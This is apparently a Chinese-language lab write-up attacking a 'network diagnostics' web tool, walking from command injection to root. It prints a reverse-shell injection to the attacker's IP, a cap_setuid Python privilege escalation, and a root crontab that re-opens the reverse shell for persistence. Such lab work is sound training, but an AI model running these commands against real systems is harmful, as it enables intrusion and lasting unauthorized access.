**环境**：靶机 10.10.1.66（YX-NetTools 网络运维工具平台），攻击机 Kali 10.10.1.96。

### **<span style="color:#3498db">信息收集</span>**

nmap 扫出 22 和 80；ffuf 扫目录得到 `2.php`、`assets`、`includes`：

![mm](/assets/img/2025-06-17-16-10-08.png)
![mm](/assets/img/2025-06-17-16-21-09.png)

首页 `/diag.php` 是个"网络连通性诊断"功能：输入目标主机（IP 或域名），**平台在服务器侧执行诊断命令并返回结果**。这类"把你的输入拼进系统命令里执行"的功能，就是命令注入的经典入口：

![mm](/assets/img/2025-06-17-16-24-40.png)

### **<span style="color:#3498db">确认命令注入</span>**

先用命令替换验证：DNS 解析模式下输入 `$(whoami).bilibili.com`。`$(...)` 是 shell 的命令替换语法，会先把 `whoami` 执行出来、把结果拼进域名，再去做解析——如果输入真的进了 shell，域名就会被替换成 `www-data.bilibili.com`：

![mm](/assets/img/2025-06-17-16-27-18.png)

返回的正是 `server can't find www-data.bilibili.com`——**注入成立**。

再用 `;` 把 ping 和想执行的命令串起来（`-1` 让 ping 报错，分号后才是我们的命令）：

```text
-1;pwd
```

![mm](/assets/img/2025-06-17-16-28-08.png)

直接返回 `/var/www/html`。

### **<span style="color:#3498db">反弹 shell</span>**

Kali 开监听，输入框注入：

```bash
-1;bash -c 'bash -i >&/dev/tcp/10.10.1.96/4444 0>&1'
```

这里被 `%26` 坑了一次：**这个表单是把内容原样交给 shell 的，不存在 URL 解码环节**，`&` 写成 `%26` 反而变成去重定向一个叫 `%26/dev/tcp/...` 的文件，直接报错。改回裸 `&` 后成功弹回 www-data 的 shell：

![mm](/assets/img/2025-06-17-16-30-34.png)

（对比前面的靶机：数据经过 URL 才需要 `%26`，是否编码**取决于数据在哪个环节被谁解析**。）

### **<span style="color:#3498db">翻文件找线索</span>**

```bash
cat ops-note.txt
cat flag_user.txt
```

运维备注写得明明白白：巡检脚本 `/usr/local/bin/netdiag-py` 需要在不同用户身份间切换，**已为其授予 capability**——这就是提权线索：

![mm](/assets/img/2025-06-17-16-34-53.png)

### **<span style="color:#3498db">capability 提权</span>**

**capability 是 Linux 把 root 特权拆成一堆细粒度小权限的机制**：SUID 是"整个 root 打包给你"，capability 是"只给你某几项特权"。看这个文件带了什么：

```bash
getcap bin/netdiag-py
# bin/netdiag-py cap_setuid=ep
```

![mm](/assets/img/2025-06-17-17-40-35.png)

**`cap_setuid`**——允许进程随意设置自己的 uid（包括设成 0），等于"定向的 root"。而 netdiag-py 启动后会开一个 python 交互终端，python 可以直接调用系统接口，于是借这个终端调用：

```python
import os
os.setuid(0)
os.system('/bin/bash')
whoami
```

![mm](/assets/img/2025-06-17-19-04-14.png)

root 到手。

### **<span style="color:#3498db">权限维持</span>**

以 root 写一个定时任务，定期自动反弹 shell 回来（分钟数随便挑一个，等几分钟就能连回来）：

```bash
crontab -e
# 10 * * 6 3 /bin/bash -c 'bash -i >&/dev/tcp/10.10.1.96/4444 0>&1'
```

![mm](/assets/img/2025-06-17-19-11-47.png)
![mm](/assets/img/2025-06-18-11-35-16.png)

监听里等到了定时任务弹回来的连接——就算前面的 shell 掉了，这条后路也还在。
